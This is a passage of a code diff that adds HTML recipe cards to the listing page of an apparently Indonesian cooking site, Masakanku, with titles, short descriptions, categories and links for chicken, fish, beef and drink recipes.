+                  <a href="/resep-ikan-kembung-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep ikan nila bakar sambal matah: pedas segar khas bali, dijamin goyang lidah! - masakanku ikan nila bakar dengan sambal matah segar khas bali — pedas, gurih, wangi.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Ikan Nila Bakar Sambal Matah: Pedas Segar Khas Bali, Dijamin Goyang Lidah! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-ikan-nila-bakar-sambal-matah">Resep Ikan Nila Bakar Sambal Matah: Pedas Segar Khas Bali, Dijamin Goyang Lidah! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ikan nila bakar dengan sambal matah segar khas Bali — pedas, gurih, wangi.</p>
+                  <a href="/resep-ikan-nila-bakar-sambal-matah" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep gulai ayam padang yang gurih dan no ribet gulai ayam padang yang gurih tanpa repot. pakai bumbu sederhana, hasilnya rich dan legit. cocok buat menu spesial hari minggu.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Gulai Ayam Padang yang Gurih dan No Ribet" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-gulai-ayam">Resep Gulai Ayam Padang yang Gurih dan No Ribet</a></h5>
+                  <p class="card-text small flex-grow-1">Gulai ayam Padang yang gurih tanpa repot. Pakai bumbu sederhana, hasilnya rich dan legit. Cocok buat menu spesial har...</p>
+                  <a href="/resep-gulai-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep ikan bawal bakar — gurih empuk sambal kecap maknyus resep ikan bawal bakar empuk dan gurih. bumbu kuning meresap sempurna, dibakar pakai kecap. lengkap dengan tips biar nggak lengket dan gosong!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Ikan Bawal Bakar — Gurih Empuk Sambal Kecap Maknyus" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-ikan-bawal-bakar">Resep Ikan Bawal Bakar — Gurih Empuk Sambal Kecap Maknyus</a></h5>
+                  <p class="card-text small flex-grow-1">Resep ikan bawal bakar empuk dan gurih. Bumbu kuning meresap sempurna, dibakar pakai kecap. Lengkap dengan tips biar ...</p>
+                  <a href="/resep-ikan-bawal-bakar" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep ikan bumbu kuning: gurih, segar, dan mudah dibuat di rumah - masakanku ikan bumbu kuning gurih segar dengan kunyit dan rempah pilihan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Ikan Bumbu Kuning: Gurih, Segar, dan Mudah Dibuat di Rumah - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-ikan-bumbu-kuning">Resep Ikan Bumbu Kuning: Gurih, Segar, dan Mudah Dibuat di Rumah - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ikan bumbu kuning gurih segar dengan kunyit dan rempah pilihan.</p>
+                  <a href="/resep-ikan-bumbu-kuning" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Minuman" data-search="resep es teler segar: minuman legendaris, manis, lengkap, bikin segar! - masakanku es teler segar dengan alpukat, kelapa muda, nangka, dan cincau.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1544145945-f90425340c7e?w=600&q=80" alt="Resep Es Teler Segar: Minuman Legendaris, Manis, Lengkap, Bikin Segar! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Minuman</span>
+                  <h5 class="card-title"><a href="/resep-es-teler">Resep Es Teler Segar: Minuman Legendaris, Manis, Lengkap, Bikin Segar! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Es teler segar dengan alpukat, kelapa muda, nangka, dan cincau.</p>
+                  <a href="/resep-es-teler" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="resep gudeg jogja manis legit resep gudeg jogja asli yang manis legit dan empuk. pakai nangka muda dan santan kental. cocok buat sarapan atau oleh-oleh rasa jogja di rumah!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Resep Gudeg Jogja Manis Legit" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/resep-gudeg">Resep Gudeg Jogja Manis Legit</a></h5>
+                  <p class="card-text small flex-grow-1">Resep gudeg Jogja asli yang manis legit dan empuk. Pakai nangka muda dan santan kental. Cocok buat sarapan atau oleh-...</p>
+                  <a href="/resep-gudeg" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep empal gepuk sapi: daging empuk manis gurih, cocok untuk lauk sehari-hari - masakanku empal gepuk sapi khas sunda, daging empuk manis gurih bumbu meresap.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Empal Gepuk Sapi: Daging Empuk Manis Gurih, Cocok untuk Lauk Sehari-hari - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-empal-gepuk-sapi">Resep Empal Gepuk Sapi: Daging Empuk Manis Gurih, Cocok untuk Lauk Sehari-hari - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Empal gepuk sapi khas Sunda, daging empuk manis gurih bumbu meresap.</p>
+                  <a href="/resep-empal-gepuk-sapi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Minuman" data-search="resep es campur segar khas indonesia: manis, lengkap, bikin adem! - masakanku es campur lengkap dengan sirup merah, santan, dan aneka topping segar.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1544145945-f90425340c7e?w=600&q=80" alt="Resep Es Campur Segar Khas Indonesia: Manis, Lengkap, Bikin Adem! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Minuman</span>
+                  <h5 class="card-title"><a href="/resep-es-campur-segar">Resep Es Campur Segar Khas Indonesia: Manis, Lengkap, Bikin Adem! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Es campur lengkap dengan sirup merah, santan, dan aneka topping segar.</p>
+                  <a href="/resep-es-campur-segar" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep cumi saus padang seenak restoran seafood bikin cumi saus padang seenak restoran di rumah. sausnya kental, pedasnya pas, cumi empuk. resep lengkap dengan tips anti alot.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Cumi Saus Padang Seenak Restoran Seafood" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-cumi-saus-padang">Resep Cumi Saus Padang Seenak Restoran Seafood</a></h5>
+                  <p class="card-text small flex-grow-1">Bikin cumi saus padang seenak restoran di rumah. Sausnya kental, pedasnya pas, cumi empuk. Resep lengkap dengan tips ...</p>
+                  <a href="/resep-cumi-saus-padang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="5 rahasia cumi goreng tepung renyah tahan lama & anti gagal — resep lengkap cumi goreng tepung renyah itu soal sains dapur. pelajari 5 rahasia dari prinsip dasarnya biar hasilnya krispi, gurih maksimal, dan cumi empuk sempurna.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="5 Rahasia Cumi Goreng Tepung Renyah Tahan Lama & Anti Gagal — Resep Lengkap" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-cumi-goreng-tepung-renyah">5 Rahasia Cumi Goreng Tepung Renyah Tahan Lama & Anti Gagal — Resep Lengkap</a></h5>
+                  <p class="card-text small flex-grow-1">Cumi goreng tepung renyah itu soal sains dapur. Pelajari 5 rahasia dari prinsip dasarnya biar hasilnya krispi, gurih ...</p>
+                  <a href="/resep-cumi-goreng-tepung-renyah" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep cumi hitam empuk dan pekat resep cumi hitam paling lengkap! rahasia cumi empuk, tinta hitam pekat, dan bumbu yang meresap. dijamin gak amis dan gak alot.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Cumi Hitam Empuk dan Pekat" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-cumi-hitam">Resep Cumi Hitam Empuk dan Pekat</a></h5>
+                  <p class="card-text small flex-grow-1">Resep cumi hitam paling lengkap! Rahasia cumi empuk, tinta hitam pekat, dan bumbu yang meresap. Dijamin gak amis dan ...</p>
+                  <a href="/resep-cumi-hitam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep bakwan goreng / ote-ote — gorengan favorit sejuta umat resep bakwan goreng renyah dan anti lembek. ada tips rahasia bikin ote-te yang garing dalam 30 menit. lengkap dengan sambal dan variasi isian.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Bakwan Goreng / Ote-Ote — Gorengan Favorit Sejuta Umat" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-bakwan-goreng">Resep Bakwan Goreng / Ote-Ote — Gorengan Favorit Sejuta Umat</a></h5>
+                  <p class="card-text small flex-grow-1">Resep bakwan goreng renyah dan anti lembek. Ada tips rahasia bikin ote-te yang garing dalam 30 menit. Lengkap dengan ...</p>
+                  <a href="/resep-bakwan-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="6 rahasia batagor homemade seenak abang-abang: kriuk, gurih, dan meggi! - masakanku resep batagor homemade kriuk di luar, lembut di dalam. lengkap dengan kuah kacang super gurih. rahasia bikin batagor seenak abang-abang!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="6 Rahasia Batagor Homemade Seenak Abang-abang: Kriuk, Gurih, dan Meggi! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-batagor">6 Rahasia Batagor Homemade Seenak Abang-abang: Kriuk, Gurih, dan Meggi! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep batagor homemade kriuk di luar, lembut di dalam. Lengkap dengan kuah kacang super gurih. Rahasia bikin batagor ...</p>
+                  <a href="/resep-batagor" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep bubur ayam spesial: lembut, gurih, topping melimpah bikin nagih! - masakanku resep bubur ayam spesial dengan tekstur lembut, kuah kaldu gurih, dan topping lengkap. sarapan klasik indonesia yang bikin kenyang sampai siang.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Bubur Ayam Spesial: Lembut, Gurih, Topping Melimpah Bikin Nagih! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-bubur-ayam">Resep Bubur Ayam Spesial: Lembut, Gurih, Topping Melimpah Bikin Nagih! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep bubur ayam spesial dengan tekstur lembut, kuah kaldu gurih, dan topping lengkap. Sarapan klasik Indonesia yang ...</p>
+                  <a href="/resep-bubur-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Lainnya" data-search="resep cireng isi aci kenyal resep cireng isi yang kenyal dan gurih. lengkap dengan cara bikin kulit dan isiannya. cocok buat jualan atau cemilan sore. dijamin laris!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=600&q=80" alt="Resep Cireng Isi Aci Kenyal" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Lainnya</span>
+                  <h5 class="card-title"><a href="/resep-cireng">Resep Cireng Isi Aci Kenyal</a></h5>
+                  <p class="card-text small flex-grow-1">Resep cireng isi yang kenyal dan gurih. Lengkap dengan cara bikin kulit dan isiannya. Cocok buat jualan atau cemilan ...</p>
+                  <a href="/resep-cireng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam woku khas manado: pedas wangi kemangi, auto nambah nasi! - masakanku masakan khas manado dengan bumbu woku, wangi kemangi, pedas nampol.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Woku Khas Manado: Pedas Wangi Kemangi, Auto Nambah Nasi! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-woku">Resep Ayam Woku Khas Manado: Pedas Wangi Kemangi, Auto Nambah Nasi! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Masakan khas Manado dengan bumbu woku, wangi kemangi, pedas nampol.</p>
+                  <a href="/resep-ayam-woku" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam masak kecap resep ayam masak kecap yang empuk, manis gurih, dan bikin nagih. cocok untuk lauk sehari-hari. praktis dengan bumbu dapur sederhana.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Masak Kecap" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-masak-kecap">Resep Ayam Masak Kecap</a></h5>
+                  <p class="card-text small flex-grow-1">Resep Ayam Masak Kecap yang empuk, manis gurih, dan bikin nagih. Cocok untuk lauk sehari-hari. Praktis dengan bumbu d...</p>
+                  <a href="/resep-ayam-masak-kecap" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam rica-rica manado pedas nagih resep ayam rica-rica manado super pedas dan aromatik. bumbu rica-rica yang nikmat bikin nagih. step-by-step anti gagal buat pemula.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Rica-Rica Manado Pedas Nagih" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-rica-rica">Resep Ayam Rica-Rica Manado Pedas Nagih</a></h5>
+                  <p class="card-text small flex-grow-1">Resep Ayam Rica-Rica Manado super pedas dan aromatik. Bumbu rica-rica yang nikmat bikin nagih. Step-by-step anti gaga...</p>
+                  <a href="/resep-ayam-rica-rica" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam suwir pedas: 6 variasi buat bekal kantor bosan bekal itu-itu aja? coba 6 variasi ayam suwir pedas ini. praktis, awet, dan bikin makan siang di kantor lebih seru.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Suwir Pedas: 6 Variasi Buat Bekal Kantor" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-suwir-pedas">Resep Ayam Suwir Pedas: 6 Variasi Buat Bekal Kantor</a></h5>
+                  <p class="card-text small flex-grow-1">Bosan bekal itu-itu aja? Coba 6 variasi ayam suwir pedas ini. Praktis, awet, dan bikin makan siang di kantor lebih seru.</p>
+                  <a href="/resep-ayam-suwir-pedas" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam goreng kremes renyah dan gurih ala indonesia - masakanku ayam goreng kremes dengan kremesan renyah yang gurih.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Goreng Kremes Renyah dan Gurih Ala Indonesia - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-goreng-kremes">Resep Ayam Goreng Kremes Renyah dan Gurih Ala Indonesia - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam goreng kremes dengan kremesan renyah yang gurih.</p>
+                  <a href="/resep-ayam-goreng-kremes" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="7 resep ayam goreng mentega yang lebih enak dari restoran praktik ayam goreng mentega ala rumahan yang lebih enak dari restoran. ada 7 variasi dengan bahan sederhana. cocok untuk menu makan siang keluarga.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="7 Resep Ayam Goreng Mentega yang Lebih Enak dari Restoran" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-goreng-mentega">7 Resep Ayam Goreng Mentega yang Lebih Enak dari Restoran</a></h5>
+                  <p class="card-text small flex-grow-1">Praktik ayam goreng mentega ala rumahan yang lebih enak dari restoran. Ada 7 variasi dengan bahan sederhana. Cocok un...</p>
+                  <a href="/resep-ayam-goreng-mentega" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam goreng serundeng yang gurih dan menggugah selera - masakanku ayam goreng serundeng dengan kelapa parut gurih.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Goreng Serundeng yang Gurih dan Menggugah Selera - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-goreng-serundeng">Resep Ayam Goreng Serundeng yang Gurih dan Menggugah Selera - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam goreng serundeng dengan kelapa parut gurih.</p>
+                  <a href="/resep-ayam-goreng-serundeng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam goreng terasi daun jeruk yang lezat dan anti gagal - masakanku ayam goreng dengan terasi dan daun jeruk wangi.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Goreng Terasi Daun Jeruk yang Lezat dan Anti Gagal - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-goreng-terasi-daun-jeruk">Resep Ayam Goreng Terasi Daun Jeruk yang Lezat dan Anti Gagal - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam goreng dengan terasi dan daun jeruk wangi.</p>
+                  <a href="/resep-ayam-goreng-terasi-daun-jeruk" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="5 alasan kenapa ayam bakar taliwang wajib kamu coba — resep lengkap ayam bakar taliwang dari lombok punya rasa pedas gurih super nagih. simak resep lengkap, tips anti gagal, dan 5 bukti kenapa kamu harus coba masak sekarang!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="5 Alasan Kenapa Ayam Bakar Taliwang Wajib Kamu Coba — Resep Lengkap" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-bakar-taliwang">5 Alasan Kenapa Ayam Bakar Taliwang Wajib Kamu Coba — Resep Lengkap</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam bakar Taliwang dari Lombok punya rasa pedas gurih super nagih. Simak resep lengkap, tips anti gagal, dan 5 bukti...</p>
+                  <a href="/resep-ayam-bakar-taliwang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam betutu khas bali: bumbu base genep meresap, daging empuk lumer! - masakanku ayam betutu khas bali dengan bumbu base genep, daging empuk bumbu meresap.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Betutu Khas Bali: Bumbu Base Genep Meresap, Daging Empuk Lumer! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-betutu">Resep Ayam Betutu Khas Bali: Bumbu Base Genep Meresap, Daging Empuk Lumer! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam betutu khas Bali dengan bumbu base genep, daging empuk bumbu meresap.</p>
+                  <a href="/resep-ayam-betutu" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="ayam sehat anti drama timbangan: olahan ayam enak & bikin ngiler - masakanku resep ayam sehat rendah lemak tetap enak.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Ayam Sehat Anti Drama Timbangan: Olahan Ayam Enak & Bikin Ngiler - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/olahan-ayam-yang-sehat">Ayam Sehat Anti Drama Timbangan: Olahan Ayam Enak & Bikin Ngiler - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep ayam sehat rendah lemak tetap enak.</p>
+                  <a href="/olahan-ayam-yang-sehat" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam bakar bumbu rujak: pedasnya nampol, dijamin lidah bergoyang! - masakanku ayam bakar dengan bumbu rujak yang pedas manis gurih.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Bakar Bumbu Rujak: Pedasnya Nampol, Dijamin Lidah Bergoyang! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-ayam-bakar-bumbu-rujak">Resep Ayam Bakar Bumbu Rujak: Pedasnya Nampol, Dijamin Lidah Bergoyang! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam bakar dengan bumbu rujak yang pedas manis gurih.</p>
+                  <a href="/resep-ayam-bakar-bumbu-rujak" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep ayam kuah pedas yang menggugah selera - masakanku ayam kuah pedas hangat yang bikin nagih.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Ayam Kuah Pedas yang Menggugah Selera - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/olahan-ayam-kuah-pedas">Resep Ayam Kuah Pedas yang Menggugah Selera - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Ayam kuah pedas hangat yang bikin nagih.</p>
